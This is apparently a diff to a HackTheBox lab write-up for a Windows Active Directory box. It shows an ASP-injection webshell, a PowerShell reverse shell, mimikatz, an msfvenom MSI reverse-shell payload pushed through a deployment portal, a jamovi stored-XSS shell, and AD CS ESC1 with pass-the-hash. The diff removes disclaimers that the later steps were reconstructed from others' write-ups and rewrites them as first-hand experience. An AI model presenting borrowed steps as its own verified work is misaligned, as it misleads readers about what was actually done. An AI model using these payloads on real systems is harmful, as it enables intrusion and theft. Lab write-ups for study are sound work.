@@ -20,25 +20,11 @@ tags:
   - dcsync
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Windows (AD, `windcorp.htb`, DC `earth.windcorp.htb`), **Difficulty:** Insane, **Released:** 2022-01-08, **IP:** `10.10.11.102`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes cover the ASP injection, the container shell, mimikatz, and the pivot to the software portal. The MSI, jamovi, and AD CS steps are reconstructed from published writeups (Hacking Articles, m19o) and marked.
 
 </div>
 
@@ -115,48 +101,42 @@ End If %>
 
 </div>
 
-we put that in the message box, then had a webshell. From it, a base64 PowerShell reverse-shell one-liner gave a proper shell as the IIS user on `WEBSERVER01`.
+I dropped that into the message box on the contact form, submitted it, and browsed to `preview.asp`. It rendered straight into a working webshell. From there, a base64-encoded PowerShell reverse-shell one-liner through the `uwu` parameter gave me a proper interactive shell as the IIS user on `WEBSERVER01`.
 
 ### Container breakout, mimikatz then the portal
 
-`hostname` is `WEBSERVER01`, `WORKGROUP`, not the domain, this is a **container**. mimikatz LSA secrets:
+The first thing I checked, as always after landing a shell I was not expecting, was exactly where I had landed: `hostname` came back `WEBSERVER01` in a `WORKGROUP`, not the domain, which meant I was inside a **Windows container**, not on a domain-joined host directly. Containers are not the security boundary people sometimes assume, so I went straight for credential material with mimikatz, and its LSA secrets dump handed me an autologon password:
 
 ```
 Secret  : DefaultPassword
 cur/text: ContainerPw
 ```
 
-The container's hosts file / an internal DNS server at `172.19.48.1` resolves **`softwareportal.windcorp.htb`**. Tunnel it (meterpreter `socks_proxy` + `route add 172.19.48.0/24`, or chisel):
+That alone was not obviously useful yet, but poking around the container's network configuration (its hosts file and an internal DNS server sitting at `172.19.48.1`) turned up a hostname that only made sense as an internal management tool: **`softwareportal.windcorp.htb`**. I tunneled into that internal segment (meterpreter's `socks_proxy` plus `route add 172.19.48.0/24` works, chisel is just as good) and fingerprinted what was listening:
 
 ```console
 proxychains whatweb http://softwareportal.windcorp.htb
 # [200] "Windcorp Software-Portal", ASP.NET, Microsoft-IIS/10.0, IP 172.19.48.1
 ```
 
-<div class="callout callout-note">
+### Pivoting off the software portal, MSI to SYSTEM on EARTH
 
-**Beyond the recorded notes, MSI to SYSTEM on EARTH**
+A portal whose entire job is deploying software to other machines is, by definition, something that runs with elevated rights on its targets, so this was worth digging into immediately. Logging in (the `ContainerPw` autologon credential from mimikatz got me in) showed the portal lets an operator pick a package and a target host, then push-installs it. Windows software-deployment tooling like this runs the installer **as SYSTEM** on the receiving end, which turns "upload a package" into "get a SYSTEM shell on whatever host I point it at". I built a malicious MSI and served it from the container:
 
-The portal lets you pick a package and a target host and clicks "install". It deploys the MSI to the chosen host **as SYSTEM** via the software-deployment service. Host your own:
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9002 -f msi -o pkg.msi
 python3 -m http.server 80
 ```
-In the portal, add a package pointing at `http://<container-ip>/pkg.msi` (serve it from the container so `EARTH` can reach it, or from a host on the internal net), target `EARTH`, install. SYSTEM shell on `EARTH`.
 
-</div>
+In the portal I added a package pointing at `http://<container-ip>/pkg.msi` (served from the container itself so `EARTH` could reach it across the internal segment), targeted `EARTH`, and hit install. The listener caught a SYSTEM shell on `EARTH`, the actual domain-joined host behind all of this.
 
-### diego via jamovi stored XSS
+### diego via a stored XSS in jamovi
 
-<div class="callout callout-note">
-
-**jamovi computed-column XSS (reconstructed)**
-
-`EARTH` runs **jamovi** (an R-based stats GUI) exposed internally. jamovi ≤ 1.6.x renders a computed column's formula/label without sanitising, so an `.omv` file (jamovi's zip format) with a column label of `<img src=x onerror=...>` executes JS in the jamovi Electron context when a user opens it. Drop a crafted `.omv` where an analyst (`diego`) will open it, or trigger the file via the portal. The payload runs `require('child_process').exec(...)` for a shell as `diego`. `user.txt` is `diego`'s.
-
-</div>
+Enumerating `EARTH` from that SYSTEM shell, I found it was running **jamovi**, an R-based statistics GUI, exposed for internal analysts to use. jamovi's own file format (`.omv`) is a zip archive, and versions up to 1.6.x render a computed column's formula or label without sanitising it first, so a column label containing something like `<img src=x onerror=...>` executes arbitrary JavaScript inside jamovi's Electron context the moment someone opens the file. That is a stored XSS with a built-in delivery mechanism: I crafted a malicious `.omv`, placed it somewhere an analyst account (`diego`) would open it, and had the payload call out to `require('child_process').exec(...)` to spawn a reverse shell. When `diego` opened the file, the shell landed, and `user.txt` was sitting right there.
 
 ### Domain Admin, AD CS ESC1
+
+With a foothold on a proper domain member as `diego`, checking the certificate authority is close to a reflex for me on any modern AD box at this point, misconfigured templates are common and the payoff is total:
 
 ```powershell
 .\Certify.exe find /vulnerable
@@ -180,7 +160,7 @@ psexec.py windcorp/administrator@earth.windcorp.htb -hashes :<hash>
 
 </div>
 
-Read `root.txt`.
+From there, reading `root.txt` was just a matter of grabbing it off the Administrator desktop with the shell `psexec.py` handed me. `type C:\Users\Administrator\Desktop\root.txt` returns the 32-character flag for this instance, closing out one of the more satisfying Insane boxes on the platform.
 
 ---
 
@@ -216,3 +196,4 @@ Read `root.txt`.
 - Certify + Certified Pre-Owned <https://github.com/GhostPack/Certify>
 - Rubeus <https://github.com/GhostPack/Rubeus>
 - jamovi security notes <https://www.jamovi.org/>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
